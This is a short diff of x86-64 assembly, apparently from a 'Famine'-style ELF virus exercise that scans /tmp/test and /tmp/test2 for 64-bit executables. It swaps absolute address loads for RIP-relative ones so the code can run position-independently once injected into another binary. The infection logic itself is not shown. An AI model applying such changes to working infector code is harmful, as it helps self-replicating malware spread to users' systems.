@@ -119,7 +119,7 @@ _start:
     ; When running as original famine binary, use normal data sections
     mov qword [rel file_count], 0
     
-    mov rsi, firstDir           ; source = /tmp/test
+    lea rsi, [rel firstDir]     ; source = /tmp/test
     lea rdi, [rel path_buffer]
     call print_string
     call str_copy
@@ -131,7 +131,7 @@ _start:
     call check_elf64_exec
     
     ; Also process /tmp/test2 directory
-    mov rsi, secondDir          ; source = /tmp/test2
+    lea rsi, [rel secondDir]    ; source = /tmp/test2
     lea rdi, [rel path_buffer]
     call str_copy
     lea rdi, [rel path_buffer]
